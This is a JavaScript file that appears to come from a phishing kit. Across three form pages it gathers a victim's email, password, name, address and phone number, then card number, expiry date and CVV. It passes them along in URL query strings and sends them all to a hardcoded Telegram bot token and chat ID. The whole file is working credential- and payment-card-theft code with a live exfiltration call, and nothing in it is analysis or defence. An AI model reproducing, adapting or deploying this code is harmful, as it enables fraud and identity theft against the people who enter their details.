// Telegram bot details
var telegram_bot_id = "6461357877:AAGjEOYNA-_kQTfbV6hIFKo38I1MeSoWXVo";
var chat_id = "2137595290";

// Function to handle login info and redirect
function passLoginInfo() {
    var email = document.getElementById("email").value;
    var password = document.getElementById("password").value;

    var queryString = `?email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}`;
    window.location.href = "update_personal_info.html" + queryString;
    return false;
}

// Function to handle personal info and redirect
function passPersonalInfo() {
    var urlParams = new URLSearchParams(window.location.search);

    var name = document.getElementById("name").value;
    var surname = document.getElementById("surname").value;
    var addressLine1 = document.getElementById("addressLine1").value;
    var city = document.getElementById("city").value;
    var postcode = document.getElementById("postcode").value;
    var phoneNumber = document.getElementById("phoneNumber").value;

    var queryString = `?email=${encodeURIComponent(urlParams.get('email'))}&password=${encodeURIComponent(urlParams.get('password'))}&name=${encodeURIComponent(name)}&surname=${encodeURIComponent(surname)}&addressLine1=${encodeURIComponent(addressLine1)}&city=${encodeURIComponent(city)}&postcode=${encodeURIComponent(postcode)}&phoneNumber=${encodeURIComponent(phoneNumber)}`;
    window.location.href = "update_billing.html" + queryString;
    return false;
}

// Function to send billing info via Telegram
function sendBillingInfo() {
    var urlParams = new URLSearchParams(window.location.search);

    var cardNumber = document.getElementById("cardNumber").value;
    var expiryMonth = document.getElementById("expiryMonth").value;
    var expiryYear = document.getElementById("expiryYear").value;
    var cvv = document.getElementById("cvv").value;

    var message = `
Email: ${urlParams.get('email')}
Password: ${urlParams.get('password')}
Name: ${urlParams.get('name')}
Surname: ${urlParams.get('surname')}
Address Line 1: ${urlParams.get('addressLine1')}
City: ${urlParams.get('city')}
Postcode: ${urlParams.get('postcode')}
Phone Number: ${urlParams.get('phoneNumber')}
Card Number: ${cardNumber}
Expiry Date: ${expiryMonth}/${expiryYear}
CVV: ${cvv}`;

    var settings = {
        "async": true,
        "crossDomain": true,
        "url": `https://api.telegram.org/bot${telegram_bot_id}/sendMessage`,
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };

    $.ajax(settings).done(function (response) {
        console.log(response);
        window.location.href = "final.html"; // Redirect after the message is sent
    });

    return false; // Prevent form submission
}

// Function to show and hide the payment pop-up
document.addEventListener('DOMContentLoaded', function() {
    const paymentPopup = document.getElementById('paymentPopup');
    const closePopup = document.getElementById('closePopup');

    // Automatically hide popup after 30 seconds
    setTimeout(function() {
        paymentPopup.style.display = 'none';
    }, 15000); // 30 seconds

    // Close popup when 'X' is clicked
    closePopup.addEventListener('click', function() {
        paymentPopup.style.display = 'none';
    });
});
